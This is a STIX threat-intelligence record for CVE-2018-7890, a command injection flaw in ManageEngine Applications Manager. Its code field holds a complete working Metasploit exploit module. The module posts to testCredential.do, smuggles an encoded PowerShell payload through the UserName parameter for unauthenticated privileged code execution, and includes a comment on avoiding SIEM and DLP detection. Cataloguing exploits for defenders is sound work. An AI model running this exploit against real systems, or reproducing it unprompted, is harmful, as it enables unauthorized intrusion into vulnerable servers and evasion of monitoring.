{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--141582c1-da7c-4b5d-b619-8608a3f9c91b",
    "created": "2024-08-14T16:53:43.691007Z",
    "modified": "2024-08-14T16:53:43.691011Z",
    "name": "\"ManageEngine Applications Manager Remote Code Execution\"",
    "description": "( This module exploits command injection vulnerability in the ManageEngine Application Manager product. An unauthenticated user can execute a operating system command under the context of privileged user.  Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials by accessing given system. This endpoint calls a several internal classes and then executes powershell script without validating user supplied parameter when the given system is OfficeSharePointServer. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_appmanager_exec.rb",
            "external_id": "manageengine_appmanager_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-7890"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/"
        },
        {
            "source_name": "reference",
            "url": "https://pitstop.manageengine.com/portal/community/topic/security-vulnerability-issues-fixed-upgrade-to-the-latest-version-of-applications-manager"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"ManageEngine Applications Manager Remote Code Execution\",\n      'Description'    => %q(\n        This module exploits command injection vulnerability in the ManageEngine Application Manager product.\n        An unauthenticated user can execute a operating system command under the context of privileged user.\n\n        Publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials\n        by accessing given system. This endpoint calls a several internal classes and then executes powershell script\n        without validating user supplied parameter when the given system is OfficeSharePointServer.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-7890'],\n          ['BID', '103358'],\n          ['URL', 'https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/'],\n          ['URL', 'https://pitstop.manageengine.com/portal/community/topic/security-vulnerability-issues-fixed-upgrade-to-the-latest-version-of-applications-manager']\n        ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 10,\n          'RPORT' => 9090\n        },\n      'Payload' =>\n        {\n          'BadChars' => \"\\x22\"\n        },\n      'Platform'       => ['win'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        => [['Automatic', {}]],\n      'Privileged'     => true,\n      'DisclosureDate' => '2018-03-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the application', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = trigger_endpoint(Rex::Text.rand_text_alpha(3))\n    if res && res.body.include?('Kindly check the credentials and try again')\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') unless check == Exploit::CheckCode::Vulnerable\n\n    powershell_options = {\n      encode_final_payload: true,\n      remove_comspec: true\n    }\n    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)\n\n    print_status('Triggering the vulnerability')\n\n    trigger_endpoint(\"$(#{p})\")\n  end\n\n  def trigger_endpoint(username)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'testCredential.do'),\n      'vars_post' => {\n        'method' => 'testCredentialForConfMonitors',\n        'type' => 'OfficeSharePointServer',\n        'montype' => 'OfficeSharePointServer',\n        'isAgentEnabled' => 'NO',\n        'isAgentAssociated' => 'false',\n        'displayname' => Rex::Text.rand_text_alpha(rand(10..15)),\n        'HostName' => '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems...\n        'Powershell' => 'True', # :-)\n        'CredSSP' => 'False',\n        'SPType' => 'SPServer',\n        'CredentialDetails' => 'nocm',\n        'Password' => Rex::Text.rand_text_alpha(3),\n        'UserName' => username\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-03-07",
    "x_mitre_platforms": [
        "['win']"
    ]
}